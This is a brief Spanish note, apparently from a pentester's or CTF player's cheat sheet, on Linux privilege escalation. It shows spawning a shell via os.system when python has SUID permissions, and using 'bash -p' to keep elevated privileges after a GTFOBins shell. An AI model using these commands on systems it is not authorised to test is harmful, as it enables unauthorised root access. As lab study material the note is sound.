
-------
Si python tiene SUID perms, ejecutamos

pythpn3
import os
os.system("whoami")
os.system("bash")


- Cuándo he conseguido bash con gtfobins y no soy root probar con 

```bash
bash -p
```